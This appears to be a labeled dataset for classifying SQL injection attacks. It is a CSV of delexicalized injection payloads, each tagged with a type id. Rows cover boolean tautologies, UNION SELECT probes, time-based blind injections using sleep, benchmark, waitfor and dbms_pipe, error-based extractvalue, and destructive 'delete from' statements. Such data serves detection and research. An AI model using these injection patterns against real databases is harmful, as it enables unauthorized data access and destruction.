payload_delex,type_id
-__INT__ ) or ( __INT__ = __INT__ ) * __INT__ and ( __INT__ = __INT__,2
delete from __IDENT__,2
"__INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) -- __IDENT__",6
"__INT__' union all select null , null#",7
"select * from __IDENT__ where __IDENT__ = __INT__ union select ! < __INT__ , __IDENT__ ( ) -- __INT__",7
__INT__ % waitfor __IDENT__ __TIME____STR__ % __STR__,6
-9978__STR__mhjt__STR__mhjt,2
-__INT__' ) where __INT__ = __INT__ order by __INT__#,0
__INT__' ) union all select null --,7
"__INT__ ) or __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( __IDENT__",6
__INT__ ) ) ) and __INT__ = __INT__#,2
-1386__STR__vsyu__STR__vsyu,2
"__INT__' union all select null , null , null --",7
"-__INT__"" ) or __INT__ = __INT__",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and sleep ( __INT__ ) #,6
"__INT__ and elt ( __INT__ = __INT__ , __INT__ )",2
"-__INT__"" where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --",2
"__INT__' in __IDENT__ __IDENT__ ) and elt ( __INT__ = __INT__ , __INT__ ) #",2
"-__INT__"" ) ) or __INT__ = __INT__#",2
__INT__ ) ) and __INT__ = __INT__,2
"__INT__ ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
__INT__ where __INT__ = __INT__ and __INT__ = __INT__,2
"__INT__"" or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",6
"__INT__' ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
__INT__ ) ) waitfor __IDENT__ __STR__ and ( ( __INT__ = __INT__,6
__INT__ waitfor __IDENT__ __IDENT__,6
"__INT__ ) where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) ) union all select null , null , null , null#",7
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__#",0
"__INT__ ) ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( ( __IDENT__",6
"__INT__ ) ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__' ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
or __INT__ = __INT__ / *,2
"-__INT__ % "" union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) #",6
__INT__' ) ) ) and __INT__ = __INT__ --,2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
waitfor __IDENT__ __STR__ ) || ',6
"-__INT__"" or __INT__ = __INT__#",2
__INT__' ) where __INT__ = __INT__ rlike sleep ( __INT__ ) #,6
"select * from __IDENT__ where __IDENT__ = __INT__ or __INT__#"". union select null , __IDENT__ ( ) -- __INT__",7
"__INT__ ) and __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( __IDENT__",6
"__INT__ % "" ) ) ) and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__' ) as __IDENT__ where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__IDENT__ __IDENT__ __IDENT__ __IDENT__ __INT__ , __INT__-__IDENT__",0
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__#",2
__INT__ % ' and __INT__ = __INT__#,2
-__INT__ ) as __IDENT__ where __INT__ = __INT__ order by __INT__ --,0
"__INT__' ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
"-__INT__ % "" ) ) ) or __INT__ = __INT__#",2
; if __IDENT__ ( __STR__ ) > __INT__ waitfor __IDENT__ __STR__ --,6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ , __STR__ , __STR__ , __STR__ ) ;",2
"__INT__"" ) where __INT__ = __INT__ rlike sleep ( __INT__ ) --",6
-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__#,2
"1__STR__neqi' where __INT__ = __INT__ union all select null , null , null , null , null , null , null --",7
"-__INT__"" ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"__INT__ % "" ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__' ) ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
1__STR__dvju__STR__dvju,2
"__INT__' in __IDENT__ __IDENT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__"" ) where __INT__ = __INT__ and __INT__ = __INT__",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ ) ;",2
-1863__STR__whwv__STR__whwv,2
__IDENT__ __IDENT__ __INT__ __INT__?__IDENT__,0
__INT__' ) ) and __INT__ = __INT__#,2
"-__INT__ ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( __IDENT__",2
"__INT__"" where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"elt ( __INT__ = __INT__ , __INT__ )",2
"__INT__ ) ) and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( __INT__ = __INT__",6
"__INT__ and elt ( __INT__ = __INT__ , __INT__ )",2
"__INT__"" and __INT__ = __INT__",2
"end and __STR__ = """,2
or __INT__ = __INT__ or __STR__ =,2
waitfor __IDENT__ __STR__ ) + ',6
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null )",0
__INT__ and sleep ( __INT__ ) and __IDENT__,6
__INT__ where __INT__ = __INT__ waitfor __IDENT__ __STR__ --,6
or __INT__ between __INT__ and __INT__,2
"__INT__"" ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
"__INT__ % ) and elt ( __INT__ = __INT__ , __INT__ ) and ( % __STR__",2
"__INT__' ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null )",2
"__INT__' where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
__INT__ and sleep ( __INT__ ) and __IDENT__,6
"__INT__' where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
"__INT__"" ) where __INT__ = __INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
1__STR__czvm__STR__czvm,2
"1__STR__abcdefg , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( __IDENT__",6
-__INT__ % __STR__ % __STR__,2
-8673__STR__edap__STR__edap,2
delete from __IDENT__,2
-__INT__ % __STR__ % __STR__,2
"or [__IDENT__] = dbms_pipe . __IDENT__ ( __STR__ , [__IDENT__] ) or [__IDENT__] = ( case when ( [__IDENT__] ) then dbms_pipe . __IDENT__ ( __STR__ , [__IDENT__] ) else [__IDENT__] end )",6
"__INT__' ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null )",2
__INT__ ) ) and __INT__ = __INT__#,2
"-__INT__"" ) ) or __INT__ = __INT__ --",2
-__INT__ union all select __INT__#,7
"1__STR__bztp' where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null , null , null --",7
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and sleep ( __INT__ ) --,6
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"call __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __STR__ = ""__IDENT__",2
-__INT__' or __INT__ = __INT__#,2
__INT__ % __STR__ % __STR__,2
"-__INT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__ ) ) ) and elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
"__INT__ ) or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
delete from __IDENT__,2
-__INT__' ) ) order by __INT__ --,0
__INT__' ) and __INT__ = __INT__,2
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,2
"__INT__ % "" ) ) ) and __INT__ = __INT__",2
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__#,2
-__INT__ % __STR__ % __STR__,2
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__#,2
"__INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",6
"__INT__ union select @@__IDENT__ , null --",7
-__INT__' where __INT__ = __INT__ or __INT__ = __INT__ --,2
-__INT__ where __INT__ = __INT__ or __INT__ = __INT__,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
__INT__ or sleep ( __INT__ ) # __IDENT__,6
"__INT__"" ) where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ --",2
-1890__STR__ecgt__STR__ecgt,2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
-__INT__ ) or __INT__ = __INT__,2
"-__INT__' ) ) ) union all select __INT__ , __INT__ --",7
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
-4397__STR__omqt__STR__omqt,2
"__INT__ ) ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( ( __IDENT__",6
"__IDENT__ __IDENT__ ( extractvalue ( [__IDENT__] , concat ( \' , ( benchmark ( [__IDENT__]__INT__ , __IDENT__ ( [__IDENT__] ) ) ) ) ) , __INT__ ) __IDENT__ __IDENT__ ( extractvalue ( [__IDENT__] , concat ( \ , ( if ( ( [__IDENT__] ) , benchmark ( [__IDENT__]__INT__ , __IDENT__ ( [__IDENT__]' ) ) , [__IDENT__] ) ) ) ) , __INT__ )",6
"__INT__"" ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"select __IDENT__ , __IDENT__ from sleep where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
-__INT__ order by __INT__ --,0
"-__INT__"" order by __INT__ --",0
__INT__ ) ) union all select null --,7
"-__INT__"" ) where __INT__ = __INT__ order by __INT__ --",0
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__ % ' ) union all select null , null , null , null , null , null , null , null#",7
"-__INT__"" ) ) ) or __INT__ = __INT__",2
"__INT__"" where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
"__INT__"" ) where __INT__ = __INT__ and sleep ( __INT__ ) #",6
"__INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) # __IDENT__",6
__INT__ ) ) ) and sleep ( __INT__ ) and ( ( ( __IDENT__,6
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"insert into column ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"-__INT__"" where __INT__ = __INT__ or __INT__ = __INT__ --",2
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where cast = __IDENT__",2
"__INT__' or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",6
__INT__ % ' and __INT__ = __INT__,2
"__INT__ ) ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( __INT__ = __INT__",6
"-__INT__' union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
__INT__ % __STR__ % __STR__,2
"__INT__"" ) ) ) and __INT__ = __INT__",2
__INT__' and __INT__ = __INT__#,2
delete from __IDENT__ where __IDENT__ = __STR__,2
"-__INT__' ) ) union all select __INT__ , __INT__ , __INT__ , __INT__#",7
delete from __IDENT__,2
-__INT__ % __STR__ % __STR__,2
-3868__STR__evnj__STR__evnj,2
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ ) # __IDENT__",2
"__INT__"" ) ) union all select null , null , null , null#",7
__INT__ ) ) ) rlike sleep ( __INT__ ) and ( ( ( __IDENT__,6
-__INT__ or ( __INT__ = __INT__ ) * __INT__ -- __IDENT__,2
-7382__STR__tvaz__STR__tvaz,2
__INT__ % ' ) ) union all select null#,7
"__INT__"" ) ) ) and __INT__ = __INT__ --",2
"-__INT__ % "" ) ) or __INT__ = __INT__#",2
-__INT__ % __STR__ % __STR__,2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ rlike sleep ( __INT__ ) --",6
-4389__STR__qoch__STR__qoch,2
"__INT__"" ) ) and __INT__ = __INT__ --",2
__INT__ % ) ) ) or sleep ( __INT__ ) and ( ( ( % __STR__,6
"__INT__"" where __INT__ = __INT__ rlike sleep ( __INT__ ) --",6
"end and ( ( ( __STR__ like ""__IDENT__",2
"__INT__ % "" ) ) ) and __INT__ = __INT__#",2
"-__INT__' or elt ( __INT__ = __INT__ , __INT__ )",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
"-__INT__' ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"-__INT__ % "" ) ) ) or __INT__ = __INT__ --",2
"__INT__ ) ) ) and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( ( __INT__ = __INT__",6
-__INT__ or __INT__ = __INT__#,2
"__INT__ % ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( % __STR__",6
"-__INT__"" ) ) ) or __INT__ = __INT__",2
"__INT__' ) where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) --",2
update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,2
-__INT__ or ( __INT__ = __INT__ ) * __INT__# __IDENT__,2
__INT__' where __INT__ = __INT__ and __INT__ = __INT__ --,2
"-__INT__"" ) or __INT__ = __INT__",2
end and ( ( __STR__ = '__IDENT__,2
"__INT__ % ' ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
__INT__ ) ) ) rlike sleep ( __INT__ ) and ( ( ( __IDENT__,6
__INT__ ) where __INT__ = __INT__ or sleep ( __INT__ ) #,6
"__INT__"" ) where __INT__ = __INT__ or sleep ( __INT__ ) --",6
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
__INT__ ) ) ) and sleep ( __INT__ ) and ( ( ( __IDENT__,6
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
-__INT__ % ' order by __INT__#,0
"select * from __IDENT__ where __IDENT__ = __INT__ * \. union select null , @@__IDENT__ -- __INT__",7
-1485__STR__vphj__STR__vphj,2
"__INT__ % ) and elt ( __INT__ = __INT__ , __INT__ ) and ( % __STR__",2
__INT__' ) ) as __IDENT__ where __INT__ = __INT__ order by __INT__#,0
"-__INT__' + ( select __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"-__INT__' ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",2
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
1__STR__edjv__STR__edjv,2
"__INT__"" where __INT__ = __INT__ waitfor __IDENT__ __STR__ --",6
__INT__ rlike sleep ( __INT__ ) #,6
1__STR__rnni__STR__rnni,2
"__INT__ % "" ) ) ) or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
-__INT__' ) union all select __INT__ --,7
"__INT__"" waitfor __IDENT__ __STR__ --",6
"__INT__ ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( ( __IDENT__",2
"__INT__ ) ) ) and __INT__ = like ( '__IDENT__' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) and ( ( ( __IDENT__",6
"__INT__"" ) where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__' in __IDENT__ __IDENT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
delete from __IDENT__,2
"__INT__"" ) ) and __INT__ = __INT__",2
"-__INT__"" or __INT__ = __INT__#",2
"__INT__' in __IDENT__ __IDENT__ ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__' + @ __INT__ union select __INT__ , __IDENT__ ( ) -- __INT__",7
"__INT__ % "" ) ) and __INT__ = __INT__#",2
-__INT__ % __STR__ % __STR__,2
__IDENT__,0
"__INT__' and elt ( __INT__ = __INT__ , __INT__ )",2
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and sleep ( __INT__ ) #,6
-__INT__ ) or ( __INT__ = __INT__ ) * __INT__ and ( __INT__ = __INT__,2
"__INT__ % ) ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( ( % __STR__",6
-4408__STR__oenu__STR__oenu,2
__INT__' and ( __INT__ = __INT__ ) * __INT__,2
"-__INT__ % "" ) ) or __INT__ = __INT__",2
"-__INT__ % ) or elt ( __INT__ = __INT__ , __INT__ ) and ( % __STR__",2
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
"__INT__ % "" or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"-__INT__"" ) ) or __INT__ = __INT__#",2
"call __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) -- __IDENT__",0
"-__INT__ ) ) ) or elt ( __INT__ = __INT__ , __INT__ ) and ( ( ( __IDENT__",2
"__INT__' ) where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) --",6
"__INT__ ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) and ( ( __IDENT__",2
__INT__ ) ) as __IDENT__ where __INT__ = __INT__ waitfor __IDENT__ __STR__ --,6
__INT__' ) ) rlike sleep ( __INT__ ) #,6
"__INT__' in __IDENT__ __IDENT__ ) and __IDENT__ ( __INT__ = __INT__ , __INT__ ) #",2
"__INT__ % "" or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ )",2
"__INT__' ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__INT__ % ' ) ) order by __INT__#,0
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ waitfor __IDENT__ __STR__ --",6
__INT__' ) where __INT__ = __INT__ rlike sleep ( __INT__ ) --,6
-__INT__ % ' ) ) ) or __INT__ = __INT__,2
__INT__ and sleep ( __INT__ ) and __IDENT__,6
-__INT__ or __INT__ = __INT__,2
"__INT__ ) ) ) union all select null , null --",7
"__IDENT__ ( __INT__ = __INT__ , __INT__ , __INT__ / __INT__ )",0
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) --",3
"__INT__ % "" ) ) and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
delete from __IDENT__,2
"__INT__ ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( __IDENT__",2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__' ) ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__IDENT__. __IDENT__ __IDENT__ , __INT__ ,",0
-__INT__ or __INT__ = __INT__#,2
"__INT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
"__INT__' ) ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
-__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,2
1__STR__rzwb__STR__rzwb,2
"-__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",7
